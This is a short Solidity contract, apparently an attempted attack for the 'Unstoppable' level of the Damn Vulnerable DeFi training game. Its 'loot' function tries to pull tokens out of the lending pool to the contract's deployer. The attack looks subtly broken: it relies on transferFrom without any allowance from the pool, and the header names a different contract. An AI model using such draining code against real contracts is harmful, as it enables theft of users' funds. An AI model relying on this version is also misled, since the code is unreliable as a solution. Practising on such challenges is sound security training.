// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title ReceiverUnstoppable
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

interface dvt{
    function transferFrom(address from, address to, uint256 amount) external;
}

contract MaliciousReceiverUnstoppable {

    address token;
    address owner;
    address pool;

    constructor(address tokenAddress, address poolAddress) {
        token = tokenAddress;
        owner = msg.sender;
        pool = poolAddress;
    }

    function loot(uint256 amount) external {
        dvt(token).transferFrom(pool, owner, amount);
    }
}